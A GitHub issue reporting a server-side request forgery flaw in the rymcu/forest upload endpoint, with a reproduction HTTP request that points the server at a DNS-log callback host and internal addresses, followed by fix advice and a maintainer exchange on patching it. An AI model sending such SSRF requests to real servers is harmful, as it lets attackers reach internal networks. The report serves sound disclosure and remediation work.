=== Content from github.com_c866f918_20250114_222515.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frymcu%2Fforest%2Fissues%2F149)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frymcu%2Fforest%2Fissues%2F149)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=rymcu%2Fforest)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rymcu](/rymcu)
/
**[forest](/rymcu/forest)**
Public

* [Notifications](/login?return_to=%2Frymcu%2Fforest) You must be signed in to change notification settings
* [Fork
  136](/login?return_to=%2Frymcu%2Fforest)
* [Star
   739](/login?return_to=%2Frymcu%2Fforest)

* [Code](/rymcu/forest)
* [Issues
  8](/rymcu/forest/issues)
* [Pull requests
  1](/rymcu/forest/pulls)
* [Discussions](/rymcu/forest/discussions)
* [Actions](/rymcu/forest/actions)
* [Projects
  0](/rymcu/forest/projects)
* [Wiki](/rymcu/forest/wiki)
* [Security](/rymcu/forest/security)
* [Insights](/rymcu/forest/pulse)

Additional navigation options

* [Code](/rymcu/forest)
* [Issues](/rymcu/forest/issues)
* [Pull requests](/rymcu/forest/pulls)
* [Discussions](/rymcu/forest/discussions)
* [Actions](/rymcu/forest/actions)
* [Projects](/rymcu/forest/projects)
* [Wiki](/rymcu/forest/wiki)
* [Security](/rymcu/forest/security)
* [Insights](/rymcu/forest/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frymcu%2Fforest%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frymcu%2Fforest%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Server-side-request-forgery (SSRF) vulnerability allow registered users to Vulnerability in com.rymcu.forest.web.api.common.UploadController（UploadControlle.java存在ssrf漏洞） #149

Closed

[shellfeel](/shellfeel) opened this issue
Dec 18, 2023
· 6 comments

Closed

# [Server-side-request-forgery (SSRF) vulnerability allow registered users to Vulnerability in com.rymcu.forest.web.api.common.UploadController（UploadControlle.java存在ssrf漏洞）](#top) #149

[shellfeel](/shellfeel) opened this issue
Dec 18, 2023
· 6 comments

## Comments

[![@shellfeel](https://avatars.githubusercontent.com/u/18633010?s=80&u=a1144484ea77e9daa9c83d19c4231578e298ecaf&v=4)](/shellfeel)

Copy link

### **[shellfeel](/shellfeel)** commented [Dec 18, 2023](#issue-2046124585)

| 1. Steps to reproduce (复现步骤)1.1 Pull the latest code and set up a test environment（拉取最新代码，搭建测试环境） Register a user using the system's registration function （使用系统的注册功能，注册一个用户） [image](https://private-user-images.githubusercontent.com/18633010/291145111-e81c7888-485b-4f04-9a12-a598bdbb5b9e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTExNDUxMTEtZTgxYzc4ODgtNDg1Yi00ZjA0LTlhMTItYTU5OGJkYmI1YjllLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBmZmE4MGFlNDYzZjZiMWE5Nzc3OTZhZTY0YjI4Mzk3OWRmZTRjNjllNjZkM2U3NTZkZjNmMGFjZGQ3YWExNmUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.s7gkjZlZQNKwkr4OifJxDbVWJvKwnR8Jkj3pmW3Ju4E) 1.2 Construct a request using the token of the registered user, and fill in the malicious address in the request parameter url.（用注册用户的token构造请求 ,在请求参数url中填写恶意地址） ``` POST /api/upload/file/link HTTP/1.1 Host: 127.0.0.1:3000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br X-Upload-Token: eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJ0ZXN0Iiwic3ViIjoidGVzdCIsImlhdCI6MTcwMjg3MTg1MX0.52fneB5s417LkY67Ry95657YCvlWcng6S3PekvvkEdA Content-Type: application/json Content-Length: 50 Origin: http://127.0.0.1:3000 Connection: close Referer: http://127.0.0.1:3000/article/post Cookie: SESSION=062279af-c20d-4004-b5e2-23e2196c52f5; auth.strategy=local; auth._token.local=eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJhZG1pbiIsInN1YiI6ImFkbWluIiwiaWF0IjoxNzAyNTQ2MTkzfQ.1aL69-kqpkwV9Xu4BOf7takNHUmhp3PzDtOGseXHr-o; auth._token_expiration.local=1702547093332; auth._refresh_token.local=01HHKTJEW0EQ8FD9GCSZ6X5ZT4; auth._refresh_token_expiration.local=1702553393333 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  {"url":"http://456.v0e01kal.eyes.sh","type":"567"}  ```  [image](https://private-user-images.githubusercontent.com/18633010/291146652-1c2eee7c-5dfd-4ca8-9c71-acb1d7a98709.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTExNDY2NTItMWMyZWVlN2MtNWRmZC00Y2E4LTljNzEtYWNiMWQ3YTk4NzA5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY1MGE5ZGRkNzE1NWJjZTk1OTgyNmI4ZDg1NTBjNzViZWQwNTk4OWY3OGYzODA3ZTQ5ZGZiNzJmZTAzNWZkNDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.XuBLakI01vbNURE8TArC18Zw6OxWCTmLk7iSC0F1aEk) 1.3 DNSLOG successfully receives the request, proving that the vulnerability exists（DNSLOG 成功收到请求，证明漏洞存在） [image](https://private-user-images.githubusercontent.com/18633010/291208725-b7f33984-a880-4bb4-9016-2a0507586350.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTEyMDg3MjUtYjdmMzM5ODQtYTg4MC00YmI0LTkwMTYtMmEwNTA3NTg2MzUwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTZhMzQ0NDdhZmI1ZDY4NzFmMTNkMDE4ZTA0MjY4NWQzMzY3ZjU0NjlkYmFiNmYzZGU1MDgyZDljNmZiYjQ0NDImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.EsuajZrYw8Y0jdt0WQBoxlEO95_A8qEUkWwZfDxp5yw) The test intranet address also received the request successfully:（测试内网地址也成功收到请求：） [image](https://private-user-images.githubusercontent.com/18633010/291210846-688f81a9-024b-4dd0-b28e-49f0ecfe0db8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTEyMTA4NDYtNjg4ZjgxYTktMDI0Yi00ZGQwLWIyOGUtNDlmMGVjZmUwZGI4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZjMmY1NjM1YWMxODhiOWFjNmEyNzk5MGRiY2E4Zjk1NWNlMmE2MWRiY2ViYTlmODA4ZWU5NjRiYzkwN2U2YTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.wY9XzYWwQqvXoVOOh8LZqSBZEaw4CMaroL2KISumAtk) [image](https://private-user-images.githubusercontent.com/18633010/291211069-971aed78-d9d2-4b52-a09f-bf98b1a7c8b5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTEyMTEwNjktOTcxYWVkNzgtZDlkMi00YjUyLWEwOWYtYmY5OGIxYTdjOGI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFlNzA0YzQ2Nzk5ZGYyYjJjOTAxZTlmOTRhZGFhYWM1ZGU1MjkxMjM1YmFkZjVkMDAwYjJjM2M5NGFkNTViNTUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ylc_FAiC_Vpl8mo0hqM--UNIKeA0XsZmvJOzRUFf0fo) 2. Vulnerability Existence Source Code Analysis（漏洞存在源码分析） src/main/java/com/rymcu/forest/web/api/common/UploadController.java The method does not limit the user parameter url, resulting in access to arbitrary intranet addresses（方法中未对用户参数url做限制，导致能访问任意的内网地址） [image](https://private-user-images.githubusercontent.com/18633010/291209668-d04d6abb-dc04-4b2d-a5be-637b36b61f6d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTEyMDk2NjgtZDA0ZDZhYmItZGMwNC00YjJkLWE1YmUtNjM3YjM2YjYxZjZkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTA3MjRkYjkyNzljZDAzYTYwODlkZmJjZmIxNDMwNDk3YmIzMTg0N2U3NjU0Y2FhODFkYzhhZDVmNzg0YTQzM2YmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.IgtCVMQhWd1JnJ3Jcv14AkjUAbYlfYf8p3FJ3AHu5lQ) 3. affected version （受影响版本） This ssrf affects the latest version of the curren（这个ssrf影响目前的最新版本） 4. fixes Recommendations (修复建议) For fix this vuln， Here is my advices:   1. Input validation and filtering: Strict validation and filtering of all user input URLs or data. Validate the format and protocol of URL parameters and allow only trusted protocols such as HTTP and HTTPS. 2. Whitelisting mechanism: Consider implementing a whitelisting mechanism to allow access only to specific domain names or IP addresses. Avoid dynamically constructed URLs, especially from user-controlled input.   为了修复这个漏洞，我有以下建议：   1. 输入验证和过滤：对所有用户输入的URL或数据进行严格验证和过滤。验证URL参数的格式和协议，只允许受信任的协议，如HTTP和HTTPS。 2. 白名单机制：考虑实施白名单机制，仅允许访问特定域名或IP地址。避免动态构建URL，特别是从用户控制的输入。 |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=80&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)

Copy link

Member

### **[ronger-x](/ronger-x)** commented [Dec 29, 2023](#issuecomment-1871703225)

| 非常抱歉, 最近在忙其他事情没有关注 issue, 感谢你的反馈, 会尽快修复此问题 |
| --- |

All reactions

Sorry, something went wrong.

[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=40&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)
[ronger-x](/ronger-x)
mentioned this issue
[Jan 9, 2024](#ref-pullrequest-2071465309)

[🐛 初步解决 SSRF 问题 https://github.com/rymcu/forest/issues/149
#157](/rymcu/forest/pull/157)
 Merged

[ronger-x](/ronger-x)
added a commit
that referenced
this issue
[Jan 9, 2024](#ref-commit-11d840e)
[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=40&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)

`[🐛 初步解决 SSRF 问题](/rymcu/forest/commit/11d840e555faac6cd3eb4fd33cbc38aa35b6add4 "🐛 初步解决 SSRF 问题 https://github.com/rymcu/forest/issues/149

🐛 初步解决 SSRF 问题 https://github.com/rymcu/forest/issues/149") [#149](https://github.com/rymcu/forest/issues/149)`
…

`[11d840e](/rymcu/forest/commit/11d840e555faac6cd3eb4fd33cbc38aa35b6add4)`

```
🐛 初步解决 SSRF 问题 [#149](https://github.com/rymcu/forest/issues/149)
```

[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=80&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)

Copy link

Member

### **[ronger-x](/ronger-x)** commented [Jan 9, 2024](#issuecomment-1882116714)

| 已提交修复代码, 期望帮忙验证问题是否还存在 |
| --- |

All reactions

Sorry, something went wrong.

[![@shellfeel](https://avatars.githubusercontent.com/u/18633010?s=80&u=a1144484ea77e9daa9c83d19c4231578e298ecaf&v=4)](/shellfeel)

Copy link

Author

### **[shellfeel](/shellfeel)** commented [Jan 11, 2024](#issuecomment-1886439587) • edited Loading

| 我单元测试了下作者的代码，逻辑感觉写反了？ 另外要完整限制内网ip的访问可能还得防范   1. 地址302重定向为内网地址 2. 域名解析的ip地址为内网ip 3. 内网ipv6地址    [image](https://private-user-images.githubusercontent.com/18633010/295823677-1d99ed8f-e179-43f8-8bd3-a4c7c656d933.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTU4MjM2NzctMWQ5OWVkOGYtZTE3OS00M2Y4LThiZDMtYTRjN2M2NTZkOTMzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIyZjEzZTc1M2I5OGU5NGExOWJiMDMzZjlkNDUxY2M3ZDkyODkzYjQyMzU3ZTAzZGJkM2U4YjRkNjAzNGQ4NmImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8pzGA9GAF7D2ysAVfZxSSyy9u7AgiUJUKEwpSAl2j2w)    [image](https://private-user-images.githubusercontent.com/18633010/295824725-4b630de8-9042-4cce-a4a2-69c2fa39b0ee.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTU4MjQ3MjUtNGI2MzBkZTgtOTA0Mi00Y2NlLWE0YTItNjljMmZhMzliMGVlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTIwMTc0Y2VlZjJlNmE0NDU4YTM0YzdmZTg4YmIxZGJiZGY4YjA3MmMzYWE0MDVlNGUxNzI4NmZjNTgyOWUxNzcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.IWHnCZQ8MlKhQynId2xGji6dH1p7nUzeKCMlR7WNbX0) |
| --- |

All reactions

Sorry, something went wrong.

[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=80&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)

Copy link

Member

### **[ronger-x](/ronger-x)** commented [Jan 11, 2024](#issuecomment-1886595128)

| 内网地址的逻辑判断确实写反了, 已修正 |
| --- |

All reactions

Sorry, something went wrong.

[![@shellfeel](https://avatars.githubusercontent.com/u/18633010?s=80&u=a1144484ea77e9daa9c83d19c4231578e298ecaf&v=4)](/shellfeel)

Copy link

Author

### **[shellfeel](/shellfeel)** commented [Jan 11, 2024](#issuecomment-1886703417) • edited Loading

| 现在这样确实能一定程度上防御ssrf，但正常的域名访问是不是也受影响了，ipv4转换成字节的时候如果是字符串域名会报null，逻辑走不到白名单 [image](https://private-user-images.githubusercontent.com/18633010/295859842-1a553438-2600-4ffd-86d8-71b9d4106931.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTU4NTk4NDItMWE1NTM0MzgtMjYwMC00ZmZkLTg2ZDgtNzFiOWQ0MTA2OTMxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTNlYzliMDRjYzg0MDM1ZGM4OGRmNzNkNzlmOTUyM2IyM2E4OWQ5MGI2ZDE0NTViMDg5MWFkNzFhOGYyMDIxNWEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ssf4pl_KckQQrCXJQ4AdcDtI6PVlqTxxKXsD4XRpVSo) [image](https://private-user-images.githubusercontent.com/18633010/295859927-49fd8d1f-0922-4f2f-a9e8-e0b48cd8af6b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM4MTMsIm5iZiI6MTczNjg5MzUxMywicGF0aCI6Ii8xODYzMzAxMC8yOTU4NTk5MjctNDlmZDhkMWYtMDkyMi00ZjJmLWE5ZTgtZTBiNDhjZDhhZjZiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIyMjUxM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY5YTBlYmMxYzE0M2M4ZjI3ZGE0ZDgwZjVjYmM3YjBlYWE2ZWRhYzZjYjlhNTMxZDFhNmJjNzBhYzI1NzAwZjQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.qY6kaf5YD4X8yO7HVAeBbjiOmQjigEUlpsHLyUJRaRU) |
| --- |

All reactions

Sorry, something went wrong.

[![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=80&u=06b83f621e6e7c5863704beec5a53ddb6dca3aee&v=4)](/ronger-x)

Copy link

Member

### **[ronger-x](/ronger-x)** commented [Jan 12, 2024](#issuecomment-1888181878)

| 已增加对当前 host 是否为 IPv4 和 IPv6 地址的判断 |
| --- |

All reactions

Sorry, something went wrong.

[![@shellfeel](https://avatars.githubusercontent.com/u/18633010?s=40&u=a1144484ea77e9daa9c83d19c4231578e298ecaf&v=4)](/shellfeel)
[shellfeel](/shellfeel)
closed this as [completed](/rymcu/forest/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jan 17, 2024](#event-11505523577)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frymcu%2Fforest%2Fissues%2F149)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@shellfeel](https://avatars.githubusercontent.com/u/18633010?s=52&v=4)](/shellfeel) [![@ronger-x](https://avatars.githubusercontent.com/u/29698602?s=52&v=4)](/ronger-x)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


